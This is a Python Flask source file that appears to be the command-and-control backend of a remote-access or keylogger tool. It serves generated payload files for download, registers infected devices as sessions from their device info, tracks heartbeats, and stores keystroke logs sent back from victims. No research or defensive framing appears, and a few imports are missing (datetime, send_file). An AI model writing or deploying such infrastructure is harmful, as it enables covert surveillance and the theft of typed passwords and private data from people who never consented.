from flask import Flask, request, jsonify
import threading
from config import Config
from database import db
from session_manager import session_manager

app = Flask(__name__)

@app.route('/health', methods=['GET'])
def health():
    return jsonify({
        'status': 'ok',
        'timestamp': datetime.now().isoformat(),
        'sessions': len(session_manager.get_active_sessions())
    })

@app.route('/download/<payload_id>', methods=['GET'])
def download(payload_id):
    from payload_generator import payload_generator
    payload = payload_generator.get_payload(payload_id)
    if payload and payload.get('exists'):
        db.mark_downloaded(payload_id)
        return send_file(payload['filepath'], as_attachment=True)
    return jsonify({'error': 'Payload not found'}), 404

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.json
    session_id = data.get('session_id')
    event_type = data.get('type')
    
    if event_type == 'connect':
        session_manager.create_session(data.get('device_info', {}))
    elif event_type == 'heartbeat':
        session_manager.update_heartbeat(session_id)
    elif event_type == 'keylog':
        db.add_keylog(session_id, data.get('log', ''))
    
    return jsonify({'status': 'ok'})

def start_webhook():
    app.run(host='0.0.0.0', port=Config.PORT)
